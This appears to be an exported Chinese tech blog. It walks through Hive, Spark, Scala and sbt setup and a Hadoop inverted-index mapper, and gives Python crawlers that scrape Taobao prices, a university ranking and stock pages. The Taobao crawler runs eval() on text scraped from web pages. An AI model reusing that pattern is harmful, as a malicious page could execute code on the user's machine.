<li>如果报错如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MetaException(message:Required table missing : &quot;`DBS`&quot; in Catalog &quot;&quot; Schema &quot;&quot;. DataNucleus requires this table to perform its persistence operations. Either your MetaData is incorrect, or you need to enable &quot;datanucleus.schema.autoCreateTables&quot;)</span><br><span class="line">	at org.apache.hadoop.hive.metastore.RetryingHMSHandler.&lt;init&gt;(RetryingHMSHandler.java:84)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>hive元数据在远程mysql中，表明远程数据库没有相应对象。<br>解决办法如下：<code>hive-site.xml</code>中加入如下条目。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;datanucleus.schema.autoCreateAll&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;true&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure>

<h1 id="hive基本操作"><a href="#hive基本操作" class="headerlink" title="hive基本操作"></a>hive基本操作</h1><p>可以查看hive支持的<a href="https://cwiki.apache.org/confluence/display/Hive/LanguageManual+Types" target="_blank" rel="noopener">数据类型</a><br>具体操作命令见文献<a href="http://dblab.xmu.edu.cn/blog/1080-2/" target="_blank" rel="noopener">1</a></p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[1] <a href="http://dblab.xmu.edu.cn/blog/1080-2/" target="_blank" rel="noopener">http://dblab.xmu.edu.cn/blog/1080-2/</a><br>[2] <a href="http://dblab.xmu.edu.cn/blog/install-mysql/" target="_blank" rel="noopener">http://dblab.xmu.edu.cn/blog/install-mysql/</a></p>
]]></content>
      <categories>
        <category>bigdata</category>
      </categories>
      <tags>
        <tag>hive</tag>
      </tags>
  </entry>
  <entry>
    <title>spark01-basic</title>
    <url>/2020/01/09/spark01-basic/</url>
    <content><![CDATA[<p>spark基础部分<br>安装和介绍<br>版本：spark-2.4.4-bin-hadoop2.7.tgz<br>scala 2.11.8<br>可以从清华大学镜像网站下载</p>
<a id="more"></a>
<h1 id="0x00-安装"><a href="#0x00-安装" class="headerlink" title="0x00 安装"></a>0x00 安装</h1><p><a href="http://spark.apache.org/docs/2.1.0/" target="_blank" rel="noopener">官网</a><br>部署模式有四种：</p>
<ul>
<li>Local模式(单机)</li>
<li>Standalone模式，用spark自带的简单集群管理器</li>
<li>YARN模式，使用YARN作为集群管理器</li>
<li>Mesos模式，使用Mesos作为集群管理器。</li>
</ul>
<h2 id="安装Scala环境"><a href="#安装Scala环境" class="headerlink" title="安装Scala环境"></a>安装Scala环境</h2><blockquote>
<p>Scala是一门现代的多范式编程语言，旨在以简练、优雅及类型安全的方式来表达常用编程模式，平滑地集成了面向对象和函数语言的特性，运行在JVM上，兼容java程序[1]</p>
<ul>
<li>下载Scala2.11.8和安装</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https://downloads.lightbend.com/scala/2.11.8/scala-2.11.8.tgz</span><br><span class="line">tar -zxvf scala-2.11.8.tgz</span><br><span class="line">sudo mv scala-2.11.8 /opt/scala-2.11.8       </span><br><span class="line">sudo chown -R hadoop:hadoop /opt/scala-2.11.8</span><br></pre></td></tr></table></figure>

<ul>
<li><p>配置环境变量<br><code>vim /etc/profile</code></p>
</li>
<li><p>写入如下内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export SCALA_HOME=/opt/scala-2.11.8</span><br><span class="line">export PATH=$PATH:$SCALA_HOME/bin</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用source命令使之生效</p>
</li>
<li><p>验证<br><code>scala -version</code></p>
</li>
</ul>
<h2 id="安装spark"><a href="#安装spark" class="headerlink" title="安装spark"></a>安装spark</h2><ul>
<li><p>下载spark2.4.4和安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http://mirrors.tuna.tsinghua.edu.cn/apache/spark/spark-2.4.4/spark-2.4.4-bin-hadoop2.7.tgz</span><br><span class="line">tar -zxvf spark-2.4.4-bin-hadoop2.7.tgz</span><br><span class="line">sudo mv spark-2.4.4-bin-hadoop2.7 /opt/spark-2.4.4-bin-hadoop2.7</span><br><span class="line">sudo chown -R hadoop:hadoop /opt/spark-2.4.4-bin-hadoop2.7</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置日志级别<br>进入conf目录进行配置<br><code>cd /opt/spark-2.4.4-bin-hadoop2.7/conf/</code><br>使用模板创建日志配置<br><code>cp log4j.properties.template log4j.properties</code><br>修改其中的一行为如下，可以避免测试中输出太多不必要的信息<br><code>log4j.rootCategory=WARN,console</code></p>
</li>
<li><p>配置Spark环境路径<br>进入conf目录<br><code>cp ./conf/spark-env.sh.template ./conf/spark.env.sh</code><br>编辑该文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export JAVA_HOME=/usr/lib/jvm/java-8-oracle</span><br><span class="line">export SPARK_HOME=/opt/spark-2.4.4-bin-hadoop2.7</span><br><span class="line">export SCALA_HOME=/opt/scala-2.11.8</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置连接HDFS文件系统的信息<br>编辑<code>./conf/spark.env.sh</code>文件<br>加入如下信息，就会使用HDFS文件系统</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export SPARK_DIST_CLASSPATH=$(/usr/local/hadoop/bin/hadoop classpath)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>一个实例：验证配置是否成功，计算Pi的值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd spark/bin</span><br><span class="line">./run-example SparkPi</span><br></pre></td></tr></table></figure>

<h1 id="0x01-Spark-shell"><a href="#0x01-Spark-shell" class="headerlink" title="0x01 Spark-shell"></a>0x01 Spark-shell</h1><h2 id="打开交互式Shell"><a href="#打开交互式Shell" class="headerlink" title="打开交互式Shell"></a>打开交互式Shell</h2><p>进入spark目录下的bin文件，可以运行一个自带的交互Shell。<br>执行命令<code>./spark-shell</code><br>退出：<code>ctrl+D</code>，或者命令<code>:quit</code><br>简单测试：<br>输入一个表达式<code>8*2+5</code>会得到一个结果<code>res0: Int=21</code></p>
<h2 id="读取linux系统本地文件"><a href="#读取linux系统本地文件" class="headerlink" title="读取linux系统本地文件"></a>读取linux系统本地文件</h2><p>可以在spark-shell窗口中读取文件，并显示第一行的内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var file = sc.textFile(&quot;/etc/protocols&quot;)</span><br><span class="line">file.count()</span><br><span class="line">file.first()</span><br></pre></td></tr></table></figure>

<h2 id="读取HDFS文件"><a href="#读取HDFS文件" class="headerlink" title="读取HDFS文件"></a>读取HDFS文件</h2><p>Spark可以不用启动Hadoop就可以运行，需要使用HDFS文件系统的话就必须先启动Hadoop。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">val textFile=sc.textFile(&quot;hdfs://localhost:9000/input/file1.txt&quot;)</span><br><span class="line">textFile.first()</span><br></pre></td></tr></table></figure>

<h1 id="0x02-Scala编写Spark应用程序"><a href="#0x02-Scala编写Spark应用程序" class="headerlink" title="0x02 Scala编写Spark应用程序"></a>0x02 Scala编写Spark应用程序</h1><p>一般都是使用IDEA进行开发，一些配置见参考文献[3]，是一个词频统计程序。<br>以下介绍的手动编写配置过程，没有使用ida。<br>使用Scala语言编写的程序需要使用<strong>sbt</strong>进行编译打包</p>
<h2 id="安装sbt"><a href="#安装sbt" class="headerlink" title="安装sbt"></a>安装sbt</h2><ul>
<li><p>下载sbt-launch</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://repo.typesafe.com/typesafe/ivy-releases/org.scala-sbt/sbt-launch/0.13.11/sbt-launch.jar</span><br></pre></td></tr></table></figure>
</li>
<li><p>新建目录<code>/opt/sbt</code><br>改变所属组<code>chown -R yijun:yijun /opt/sbt</code><br>将下载的<code>sbt-launch.jar</code>移动到该目录下</p>
<br></li>
<li><p>在<code>/opt/sbt</code>目录下创建脚本<br><code>vim ./sbt</code><br>内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">SBT_OPTS=&quot;-Xms512M -Xmx1536M -Xss1M -XX:+CMSClassUnloadingEnabled -XX:MaxPermSize=256M&quot;</span><br><span class="line">java $SBT_OPTS -jar `dirname $0`/sbt-launch.jar &quot;$@&quot;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>脚本增加可执行权限<code>chmod 755 ./sbt</code><br><br></p>
<ul>
<li>检验sbt是否可用<br><code>./sbt sbt-version</code><br>这个步骤很漫长。<br>安装成功后会显示<code>[info] 0.13.11</code>信息。</li>
</ul>
<p>之后的步骤见参考文献[1]</p>
<h2 id="编写程序"><a href="#编写程序" class="headerlink" title="编写程序"></a>编写程序</h2><ul>
<li><p>新建一个目录作为应用程序根目录，必须使用特定的文件结构(sbt要求的)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~   </span><br><span class="line">mkdir ./sparkapp   </span><br><span class="line">mkdir -p ./sparkapp/src/main/scala</span><br></pre></td></tr></table></figure>
</li>
<li><p>新建一个示例程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim ./sparkapp/src/main/scala/SimpleApp.scala</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>写入如下代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/* SimpleApp.scala */</span><br><span class="line">import org.apache.spark.SparkContext</span><br><span class="line">import org.apache.spark.SparkContext._</span><br><span class="line">import org.apache.spark.SparkConf</span><br><span class="line"> </span><br><span class="line">object SimpleApp &#123;</span><br><span class="line">  def main(args: Array[String]) &#123;</span><br><span class="line">    #注意修改该文件的路径</span><br><span class="line">    val logFile = &quot;file:///usr/local/spark/README.md&quot; // Should be some file on your system</span><br><span class="line">    val conf = new SparkConf().setAppName(&quot;Simple Application&quot;)</span><br><span class="line">    val sc = new SparkContext(conf)</span><br><span class="line">    val logData = sc.textFile(logFile, 2).cache()</span><br><span class="line">    val numAs = logData.filter(line =&gt; line.contains(&quot;a&quot;)).count()</span><br><span class="line">    val numBs = logData.filter(line =&gt; line.contains(&quot;b&quot;)).count()</span><br><span class="line">    println(&quot;Lines with a: %s, Lines with b: %s&quot;.format(numAs, numBs))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>编写编译配置文件<br>在主目录下<code>./sparkapp</code>中新建文件<code>simple.sbt</code><br>添加如下内容，指定Spark和scala版本<br>其中的参数版本根据<a href="http://spark.apache.org/downloads.html" target="_blank" rel="noopener">官网设置</a><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name := &quot;simple Project&quot;</span><br><span class="line">version := &quot;0.1&quot;</span><br><span class="line">scalaVersion := &quot;2.11.8&quot;</span><br><span class="line">libraryDependencies += &quot;org.apache.spark&quot; %% &quot;spark-core&quot; % &quot;2.4.4&quot;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>可以使用<code>find</code>命令查看文件结构</p>
<ul>
<li>sbt打包<br>首先一定要进入工程目录下，<code>cd ~/sparkapp</code><br>然后使用sbt命令进行打包<br>我们已经在安装sbt的步骤中写好了启动脚本<br><code>/opt/sbt/sbt package</code><br>会在<code>target</code>目录下生成jar包<br></li>
<li>运行程序<br>上一步骤生成的jar包可以通过如下命令提交到spark中去运行。<br>如果配置环境变量，使用命令(在spark的bin目录下)<code>spark-submit</code>。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">spark-submit --class &quot;SimpleApp&quot; simple-project_2.10-1.0.jar</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h1 id="0x03-java编写spark应用程序"><a href="#0x03-java编写spark应用程序" class="headerlink" title="0x03 java编写spark应用程序"></a>0x03 java编写spark应用程序</h1><p>来源于参考文献[4]<br>使用java语言编写sprak需使用maven工具<br><code>src/main/</code>下新建<code>SimpleApp.java</code><br>编写程序<br>pom文件中内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;project&gt;</span><br><span class="line">    &lt;groupId&gt;edu.berkeley&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;simple-project&lt;/artifactId&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line">    &lt;name&gt;Simple Project&lt;/name&gt;</span><br><span class="line">    &lt;packaging&gt;jar&lt;/packaging&gt;</span><br><span class="line">    &lt;version&gt;1.0&lt;/version&gt;</span><br><span class="line">    &lt;repositories&gt;</span><br><span class="line">        &lt;repository&gt;</span><br><span class="line">            &lt;id&gt;Akka repository&lt;/id&gt;</span><br><span class="line">            &lt;url&gt;http://repo.akka.io/releases&lt;/url&gt;</span><br><span class="line">        &lt;/repository&gt;</span><br><span class="line">    &lt;/repositories&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt; &lt;!-- Spark dependency --&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.spark&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spark-core_2.11&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.4.4&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>

<p>这里可以<a href="https://search.maven.org/" target="_blank" rel="noopener">查阅</a>， 搜索<code>spark-core</code><br>同样可以生成jar包，用<code>spark-submit</code>命令提交</p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="http://dblab.xmu.edu.cn/blog/spark-quick-start-guide/" target="_blank" rel="noopener">http://dblab.xmu.edu.cn/blog/spark-quick-start-guide/</a><br>[2] <a href="https://www.shiyanlou.com/courses/456/learning/?id=1433" target="_blank" rel="noopener">https://www.shiyanlou.com/courses/456/learning/?id=1433</a><br>[3] <a href="http://dblab.xmu.edu.cn/blog/1492-2/" target="_blank" rel="noopener">http://dblab.xmu.edu.cn/blog/1492-2/</a><br>[4] <a href="http://dblab.xmu.edu.cn/blog/931-2/" target="_blank" rel="noopener">http://dblab.xmu.edu.cn/blog/931-2/</a></p>
]]></content>
      <categories>
        <category>bigdata</category>
      </categories>
      <tags>
        <tag>spark</tag>
      </tags>
  </entry>
  <entry>
    <title>interviewMaterial</title>
    <url>/2020/01/08/interviewMaterial/</url>
    <content><![CDATA[<p>面试需要的知识点</p>
<h1 id="大数据"><a href="#大数据" class="headerlink" title="大数据"></a>大数据</h1><h2 id="分布式计算框架MapReduce"><a href="#分布式计算框架MapReduce" class="headerlink" title="分布式计算框架MapReduce"></a>分布式计算框架MapReduce</h2><p>一个详细的<a href="https://edu.aliyun.com/lesson_1802_15663?spm=5176.10731542.0.0.3de6244bV0ewPg#_15663" target="_blank" rel="noopener">技术参考文档</a></p>
]]></content>
      <categories>
        <category>interview</category>
      </categories>
      <tags>
        <tag>interview</tag>
      </tags>
  </entry>
  <entry>
    <title>crawler</title>
    <url>/2020/01/07/crawler/</url>
    <content><![CDATA[<p>爬虫的一些简单实例</p>
<a id="more"></a>

<h1 id="0x00-爬取淘宝商品和价格"><a href="#0x00-爬取淘宝商品和价格" class="headerlink" title="0x00 爬取淘宝商品和价格"></a>0x00 爬取淘宝商品和价格</h1><p>使用正则和request库。<br>获取数据，对数据进行解析，然后打印输出。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#CrowTaobaoPrice.py</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def getHTMLText(url):</span><br><span class="line">    try:</span><br><span class="line">        r = requests.get(url, timeout=30)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        return r.text</span><br><span class="line">    except:</span><br><span class="line">        return &quot;&quot;</span><br><span class="line">    </span><br><span class="line">def parsePage(ilt, html):</span><br><span class="line">    try:</span><br><span class="line">        plt = re.findall(r&apos;\&quot;view_price\&quot;\:\&quot;[\d\.]*\&quot;&apos;,html)</span><br><span class="line">        tlt = re.findall(r&apos;\&quot;raw_title\&quot;\:\&quot;.*?\&quot;&apos;,html)</span><br><span class="line">        for i in range(len(plt)):</span><br><span class="line">            price = eval(plt[i].split(&apos;:&apos;)[1])</span><br><span class="line">            title = eval(tlt[i].split(&apos;:&apos;)[1])</span><br><span class="line">            ilt.append([price , title])</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;&quot;)</span><br><span class="line"></span><br><span class="line">def printGoodsList(ilt):</span><br><span class="line">    tplt = &quot;&#123;:4&#125;\t&#123;:8&#125;\t&#123;:16&#125;&quot;</span><br><span class="line">    print(tplt.format(&quot;序号&quot;, &quot;价格&quot;, &quot;商品名称&quot;))</span><br><span class="line">    count = 0</span><br><span class="line">    for g in ilt:</span><br><span class="line">        count = count + 1</span><br><span class="line">        print(tplt.format(count, g[0], g[1]))</span><br><span class="line">        </span><br><span class="line">def main():</span><br><span class="line">    goods = &apos;书包&apos;</span><br><span class="line">    depth = 3</span><br><span class="line">    start_url = &apos;https://s.taobao.com/search?q=&apos; + goods</span><br><span class="line">    infoList = []</span><br><span class="line">    for i in range(depth):</span><br><span class="line">        try:</span><br><span class="line">            url = start_url + &apos;&amp;s=&apos; + str(44*i)</span><br><span class="line">            html = getHTMLText(url)</span><br><span class="line">            parsePage(infoList, html)</span><br><span class="line">        except:</span><br><span class="line">            continue</span><br><span class="line">    printGoodsList(infoList)</span><br><span class="line">    </span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<h1 id="0x01-静态页面的大学排名爬取"><a href="#0x01-静态页面的大学排名爬取" class="headerlink" title="0x01 静态页面的大学排名爬取"></a>0x01 静态页面的大学排名爬取</h1><p>只是用简单的正则和BeautifulSoup库<br>打印输出到屏幕</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#CrawUnivRankingB.py</span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import bs4</span><br><span class="line"></span><br><span class="line">def getHTMLText(url):</span><br><span class="line">    try:</span><br><span class="line">        r = requests.get(url, timeout=30)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        return r.text</span><br><span class="line">    except:</span><br><span class="line">        return &quot;&quot;</span><br><span class="line"></span><br><span class="line">def fillUnivList(ulist, html):</span><br><span class="line">    soup = BeautifulSoup(html, &quot;html.parser&quot;)</span><br><span class="line">    for tr in soup.find(&apos;tbody&apos;).children:</span><br><span class="line">        if isinstance(tr, bs4.element.Tag):</span><br><span class="line">            tds = tr(&apos;td&apos;)</span><br><span class="line">            ulist.append([tds[0].string, tds[1].string, tds[3].string])</span><br><span class="line"></span><br><span class="line">def printUnivList(ulist, num):</span><br><span class="line">    tplt = &quot;&#123;0:^10&#125;\t&#123;1:&#123;3&#125;^10&#125;\t&#123;2:^10&#125;&quot;</span><br><span class="line">    print(tplt.format(&quot;排名&quot;,&quot;学校名称&quot;,&quot;总分&quot;,chr(12288)))</span><br><span class="line">    for i in range(num):</span><br><span class="line">        u=ulist[i]</span><br><span class="line">        print(tplt.format(u[0],u[1],u[2],chr(12288)))</span><br><span class="line">    </span><br><span class="line">def main():</span><br><span class="line">    uinfo = []</span><br><span class="line">    url = &apos;http://www.zuihaodaxue.cn/zuihaodaxuepaiming2016.html&apos;</span><br><span class="line">    html = getHTMLText(url)</span><br><span class="line">    fillUnivList(uinfo, html)</span><br><span class="line">    printUnivList(uinfo, 20) # 20 univs</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<h1 id="0x02-爬取股票数据"><a href="#0x02-爬取股票数据" class="headerlink" title="0x02 爬取股票数据"></a>0x02 爬取股票数据</h1><p>使用正则和BeautifulSoup库<br>结果写到文件中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#CrawBaiduStocksA.py</span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import traceback</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def getHTMLText(url):</span><br><span class="line">    try:</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        return r.text</span><br><span class="line">    except:</span><br><span class="line">        return &quot;&quot;</span><br><span class="line"></span><br><span class="line">def getStockList(lst, stockURL):</span><br><span class="line">    html = getHTMLText(stockURL)</span><br><span class="line">    soup = BeautifulSoup(html, &apos;html.parser&apos;) </span><br><span class="line">    a = soup.find_all(&apos;a&apos;)</span><br><span class="line">    for i in a:</span><br><span class="line">        try:</span><br><span class="line">            href = i.attrs[&apos;href&apos;]</span><br><span class="line">            lst.append(re.findall(r&quot;[s][hz]\d&#123;6&#125;&quot;, href)[0])</span><br><span class="line">        except:</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">def getStockInfo(lst, stockURL, fpath):</span><br><span class="line">    for stock in lst:</span><br><span class="line">        url = stockURL + stock + &quot;.html&quot;</span><br><span class="line">        html = getHTMLText(url)</span><br><span class="line">        try:</span><br><span class="line">            if html==&quot;&quot;:</span><br><span class="line">                continue</span><br><span class="line">            infoDict = &#123;&#125;</span><br><span class="line">            soup = BeautifulSoup(html, &apos;html.parser&apos;)</span><br><span class="line">            stockInfo = soup.find(&apos;div&apos;,attrs=&#123;&apos;class&apos;:&apos;stock-bets&apos;&#125;)</span><br><span class="line"></span><br><span class="line">            name = stockInfo.find_all(attrs=&#123;&apos;class&apos;:&apos;bets-name&apos;&#125;)[0]</span><br><span class="line">            infoDict.update(&#123;&apos;股票名称&apos;: name.text.split()[0]&#125;)</span><br><span class="line">            </span><br><span class="line">            keyList = stockInfo.find_all(&apos;dt&apos;)</span><br><span class="line">            valueList = stockInfo.find_all(&apos;dd&apos;)</span><br><span class="line">            for i in range(len(keyList)):</span><br><span class="line">                key = keyList[i].text</span><br><span class="line">                val = valueList[i].text</span><br><span class="line">                infoDict[key] = val</span><br><span class="line">            </span><br><span class="line">            with open(fpath, &apos;a&apos;, encoding=&apos;utf-8&apos;) as f:</span><br><span class="line">                f.write( str(infoDict) + &apos;\n&apos; )</span><br><span class="line">        except:</span><br><span class="line">            traceback.print_exc()</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    stock_list_url = &apos;http://quote.eastmoney.com/stocklist.html&apos;</span><br><span class="line">    stock_info_url = &apos;https://gupiao.baidu.com/stock/&apos;</span><br><span class="line">    output_file = &apos;D:/BaiduStockInfo.txt&apos;</span><br><span class="line">    slist=[]</span><br><span class="line">    getStockList(slist, stock_list_url)</span><br><span class="line">    getStockInfo(slist, stock_info_url, output_file)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<h2 id="0x03-爬取股票数据2"><a href="#0x03-爬取股票数据2" class="headerlink" title="0x03 爬取股票数据2"></a>0x03 爬取股票数据2</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#CrawBaiduStocksB.py</span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import traceback</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def getHTMLText(url, code=&quot;utf-8&quot;):</span><br><span class="line">    try:</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        r.encoding = code</span><br><span class="line">        return r.text</span><br><span class="line">    except:</span><br><span class="line">        return &quot;&quot;</span><br><span class="line"></span><br><span class="line">def getStockList(lst, stockURL):</span><br><span class="line">    html = getHTMLText(stockURL, &quot;GB2312&quot;)</span><br><span class="line">    soup = BeautifulSoup(html, &apos;html.parser&apos;) </span><br><span class="line">    a = soup.find_all(&apos;a&apos;)</span><br><span class="line">    for i in a:</span><br><span class="line">        try:</span><br><span class="line">            href = i.attrs[&apos;href&apos;]</span><br><span class="line">            lst.append(re.findall(r&quot;[s][hz]\d&#123;6&#125;&quot;, href)[0])</span><br><span class="line">        except:</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">def getStockInfo(lst, stockURL, fpath):</span><br><span class="line">    count = 0</span><br><span class="line">    for stock in lst:</span><br><span class="line">        url = stockURL + stock + &quot;.html&quot;</span><br><span class="line">        html = getHTMLText(url)</span><br><span class="line">        try:</span><br><span class="line">            if html==&quot;&quot;:</span><br><span class="line">                continue</span><br><span class="line">            infoDict = &#123;&#125;</span><br><span class="line">            soup = BeautifulSoup(html, &apos;html.parser&apos;)</span><br><span class="line">            stockInfo = soup.find(&apos;div&apos;,attrs=&#123;&apos;class&apos;:&apos;stock-bets&apos;&#125;)</span><br><span class="line"></span><br><span class="line">            name = stockInfo.find_all(attrs=&#123;&apos;class&apos;:&apos;bets-name&apos;&#125;)[0]</span><br><span class="line">            infoDict.update(&#123;&apos;股票名称&apos;: name.text.split()[0]&#125;)</span><br><span class="line">            </span><br><span class="line">            keyList = stockInfo.find_all(&apos;dt&apos;)</span><br><span class="line">            valueList = stockInfo.find_all(&apos;dd&apos;)</span><br><span class="line">            for i in range(len(keyList)):</span><br><span class="line">                key = keyList[i].text</span><br><span class="line">                val = valueList[i].text</span><br><span class="line">                infoDict[key] = val</span><br><span class="line">            </span><br><span class="line">            with open(fpath, &apos;a&apos;, encoding=&apos;utf-8&apos;) as f:</span><br><span class="line">                f.write( str(infoDict) + &apos;\n&apos; )</span><br><span class="line">                count = count + 1</span><br><span class="line">                print(&quot;\r当前进度: &#123;:.2f&#125;%&quot;.format(count*100/len(lst)),end=&quot;&quot;)</span><br><span class="line">        except:</span><br><span class="line">            count = count + 1</span><br><span class="line">            print(&quot;\r当前进度: &#123;:.2f&#125;%&quot;.format(count*100/len(lst)),end=&quot;&quot;)</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    stock_list_url = &apos;http://quote.eastmoney.com/stocklist.html&apos;</span><br><span class="line">    stock_info_url = &apos;https://gupiao.baidu.com/stock/&apos;</span><br><span class="line">    output_file = &apos;D:/BaiduStockInfo.txt&apos;</span><br><span class="line">    slist=[]</span><br><span class="line">    getStockList(slist, stock_list_url)</span><br><span class="line">    getStockInfo(slist, stock_info_url, output_file)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>tool</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>beautifulSoup</tag>
      </tags>
  </entry>
  <entry>
    <title>hadoop03-InvertIndex</title>
    <url>/2020/01/07/hadoop03-InvertIndex/</url>
    <content><![CDATA[<p>hadoop应用实例：倒排索引</p>
<a id="more"></a>
<h1 id="0x00问题描述"><a href="#0x00问题描述" class="headerlink" title="0x00问题描述"></a>0x00问题描述</h1><p>先看一个具体例子，我们有三个文件，如下所示。<br>file1.txt内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mapreduce is simple</span><br></pre></td></tr></table></figure>

<p>file2.txt内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mapreduce is powerful and simple</span><br></pre></td></tr></table></figure>

<p>file3.txt内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mapreduce and mapreduce</span><br></pre></td></tr></table></figure>

<p>建立倒排索引之后应该是这样的。每一行第一个是一个单词，然后后面的字符是其出现在的文件及其出现的次数(表示权重)。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and file3.txt:1;file2.txt:1;</span><br><span class="line">is file2.txt:1;file1.txt:1;</span><br><span class="line">mapreduce file1.txt:1;file2.txt:1;file3.txt:2;</span><br><span class="line">powerful file2.txt:1;</span><br><span class="line">simple file2.txt:1;file1.txt:1;</span><br></pre></td></tr></table></figure>

<h1 id="0x01-mapReduce实现"><a href="#0x01-mapReduce实现" class="headerlink" title="0x01 mapReduce实现"></a>0x01 mapReduce实现</h1><p>具体需要导入的包见<code>hadoop02-wordCount</code></p>
<h2 id="map函数及其实现"><a href="#map函数及其实现" class="headerlink" title="map函数及其实现"></a>map函数及其实现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static class Map extends Mapper&lt;Object, Text, Text, Text&gt; &#123;</span><br><span class="line">       private Text keyInfo = new Text(); // 存储单词和URL组合</span><br><span class="line">       private Text valueInfo = new Text(); // 存储词频</span><br><span class="line">       private FileSplit split; // 存储Split对象</span><br><span class="line">       // 实现map函数</span><br><span class="line">       @Override</span><br><span class="line">       public void map(Object key, Text value, Context context) throws IOException, InterruptedException &#123;</span><br><span class="line">           // 获得&lt;key,value&gt;对所属的FileSplit对象</span><br><span class="line">           split = (FileSplit) context.getInputSplit();</span><br><span class="line">           StringTokenizer itr = new StringTokenizer(value.toString());</span><br><span class="line">           while (itr.hasMoreTokens()) &#123;</span><br><span class="line">               // key值由单词和文件名组成, value 值初始化为 1. 组成key-value对:</span><br><span class="line">               // 如: (MapReduce:file1.txt, 1)</span><br><span class="line"></span><br><span class="line">               String pathname=split.getPath().getName();  //获取目录名字</span><br><span class="line">               String thisKet = itr.nextToken() + &quot;:&quot;+ pathname;</span><br><span class="line">               keyInfo.set(thisKet);</span><br><span class="line">               valueInfo.set(&quot;1&quot;);</span><br><span class="line">               context.write(keyInfo, valueInfo);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>word:fileName作为key，词频作为value输出。</p>
